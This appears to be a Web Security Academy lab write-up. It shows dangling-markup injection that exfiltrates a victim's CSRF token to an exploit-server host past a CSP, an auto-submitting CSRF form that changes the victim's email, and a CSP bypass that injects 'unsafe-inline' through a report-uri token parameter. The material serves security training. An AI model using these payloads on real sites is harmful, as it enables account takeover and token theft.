If we try to use a image, first we are going to check if work.

```
"><img src="https://google.es">
```

In the console appear:
```
Content-Security-Policy: The page’s settings blocked the loading of a resource (img-src) at [https://google.es/](https://google.es/ "https://google.es/") because it violates the following directive: “img-src 'self'”
```

If we inspect the content-security-policy:
```
content-security-policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
```

Okey, let'ts think out of the box, if we inspect the website we have a form that send data via POST to /my-account/change-email. What happends if we create another form? **we will have inside the input hidden with the csrf token** and we can send to a malicious server.

```
"></form><form class="login-form" name="malicious-form" action="https://exploit-0ab4006d038be35680f87a5501b5009a.exploit-server.net/exploit" method="GET">
```

Remember that you have the original `</form>` that will close this new form.

```
https://0aef00830312e3e5807f7b7b002a00ef.web-security-academy.net/my-account?email=prueba"></form><form class="login-form" name="malicious-form" action="https://exploit-0ab4006d038be35680f87a5501b5009a.exploit-server.net/exploit" method="GET">
```

If we inject this code and inspect we see that in our new form we have the input hidden with the csrf token and the button.

We can add a new button that submit the new malicous form.
```
"></form><form class="login-form" name="malicious-form" action="https://exploit-0ab4006d038be35680f87a5501b5009a.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click me</button
```

Now if you go to access logs of exploit sever you don't see nothing, but if you click the button you are going to see in the url the csrf token and if you reload the access logs you see the token again.

Now we have to do that the user click the button, in exploit server you can put this:

```html
<script>
location = 'https://0aef00830312e3e5807f7b7b002a00ef.web-security-academy.net/my-account?email=prueba"></form><form class="login-form" name="malicious-form" action="https://exploit-0ab4006d038be35680f87a5501b5009a.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click me</button';
</script>
```

Remember that in the description of the lab tell us that we need to add the word Click to simulate the user click it.

Now if we open the access log in other windows, store de exploit server and view exploit and click the exploit and reload the access log we see our csrf token. To see the token of the victim we have to deliver exploit to victim, reload the access log and see another csrf token.

If we try to send the request to /my-account/change-email with this csrf token an another mail we should be able to change the email.

But not, we obtain **404** invalid csrf token, why?

Because we have a incorrect session cookie, we need the session cookie of that user.

Burpsuite professional can create a CSRF PoC engagement tools > Generate CSRF PoC.

What is this? Burpsuite generate a structure very useful for us malicious page that generate a form that send hidden values via POST and as the user is authenticated change his own mail.

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aef00830312e3e5807f7b7b002a00ef.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;hacker&#46;com" />
      <input type="hidden" name="csrf" value="meQAHuleS9qqv98lgh2ybmKtLaNigsXR" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Remember to change the email, use this code in the exploit server(store > delivery exploit to victim):

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aef00830312e3e5807f7b7b002a00ef.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="`hacker@evil-user.net`" />
      <input type="hidden" name="csrf" value="meQAHuleS9qqv98lgh2ybmKtLaNigsXR" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# Reflected XSS protected by CSP, with CSP bypass

We can inject html but when try to inject an alert doesn't work, we check the console and obtain the error of **script-src: self**. This work if in CSP exist **unsafe-inline** but is not the case.


If we inspect the content-security-policy in the request see something strange.
```
default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

In network tool we see that is sending a request to /csp-report?token=

What happens if we try to **add** the token to our request:

```
https://0abe00f703f4e31c8066a83e003900a0.web-security-academy.net/?search=<script>alert(0)</script>&token=test
```

- `&` -> Add more parameters inside the same query.
- `?` -> Only can be used one time, everything that comes after is interpreted like parameters.

Looking at the network request again, we can observe that we have some control over the CSP.

```
https://0abe00f703f4e31c8066a83e003900a0.web-security-academy.net/?search=<script>alert(0)</script>&token=;script-src-elem 'unsafe-inline'
```

---

# Cheatsheets

- [XSS Cheatsheet portswigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
